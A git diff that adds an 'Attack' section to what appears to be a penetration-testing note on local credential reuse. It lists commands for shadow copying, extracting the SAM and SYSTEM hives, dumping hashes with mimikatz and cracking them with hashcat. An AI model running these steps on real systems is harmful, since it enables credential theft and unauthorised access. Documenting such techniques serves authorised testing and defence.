@@ -15,5 +15,25 @@ Although it is rare to find matching local credentials between disparate machine
 
 ***Attack***:  
 
+To get local client workstation name and administrator RID.  Follow commands below
+```plaintext
+$env:computername
+[wmi] "Win32_userAccount.Domain='client',Name='Administrator'"
+```
+<br>
+
+<img width="857" height="343" alt="image" src="https://github.com/user-attachments/assets/1f7e1521-032f-4e7a-92f6-0f1827ae132d" />
+
+
+
 1) Create shadow copy:          wmic shadowcopy call create Volume='C:\'
 2) Locate Shadow copy:          vssadmin list shadows
+3) Copy SYSTEM / SAM off of host  
+4) mimikatz lsadump::sam /system:systemfile /sam:samfile  
+5) Hashcat the password:  
+
+**Mask attack** ./hashcat64.bin -m 1000 -a 3 -w 3 -O hash.txt -1 ?l?d ?1?1?1?1?1?1?1?1?1 -i --increment-min=5
+**Password List** .\hashcat.exe -m 1000 -a 0 -w 3 -O hash.txt password_list.txt
+
+
+
